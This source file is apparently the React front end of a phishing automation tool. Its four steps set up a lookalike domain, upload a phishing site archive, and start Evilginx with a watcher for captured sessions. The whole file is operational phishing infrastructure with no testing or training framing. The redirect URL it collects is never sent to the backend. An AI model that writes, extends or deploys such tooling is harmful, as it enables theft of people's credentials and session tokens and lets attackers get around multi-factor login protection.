import React, { useState } from 'react';
import { API_BASE } from './api';

function App() {
  const [step, setStep] = useState(1);
  const [domain, setDomain] = useState('');
  const [zipFile, setZipFile] = useState(null);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [status, setStatus] = useState('');

  // const API_BASE = "http://172.23.135.145:5000/api";

  const handleDomainSubmit = async () => {
    const res = await fetch(`${API_BASE}/setup-domain`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ domain }),
    });
    const data = await res.json();
    setStatus(data.output);
    setStep(2);
  };

  const handleZipUpload = async () => {
    const formData = new FormData();
    formData.append("file", zipFile);

    const res = await fetch(`${API_BASE}/setup-phishing-site`, {
      method: "POST",
      body: formData,
    });

    const data = await res.json();
    setStatus(data.output);
    setStep(3);
  };

  const handleStartEvilginx = async () => {
    await fetch(`${API_BASE}/start-evilginx`, { method: "POST" });
    await fetch(`${API_BASE}/start-watcher`);
    setStatus("Evilginx started. Watching for sessions...");
    setStep(4);
  };

  return (
    <div style={{ maxWidth: 600, margin: "40px auto", padding: 20 }}>
      <h1>Phishing Automation</h1>
      {step === 1 && (
        <>
          <h2>Step 1: Enter Domain</h2>
          <input type="text" value={domain} onChange={(e) => setDomain(e.target.value)} placeholder="e.g. login.example.com" />
          <br /><br />
          <button onClick={handleDomainSubmit}>Next</button>
        </>
      )}

      {step === 2 && (
        <>
          <h2>Step 2: Upload Phishing Site ZIP</h2>
          <input type="file" onChange={(e) => setZipFile(e.target.files[0])} />
          <br /><br />
          <button onClick={handleZipUpload}>Next</button>
        </>
      )}

      {step === 3 && (
        <>
          <h2>Step 3: Enter Redirect URL</h2>
          <input type="text" value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)} placeholder="e.g. https://originalsite.com" />
          <br /><br />
          <button onClick={handleStartEvilginx}>Start Evilginx</button>
        </>
      )}

      {step === 4 && (
        <>
          <h2>Step 4: Status</h2>
          <pre>{status}</pre>
        </>
      )}
    </div>
  );
}

export default App;

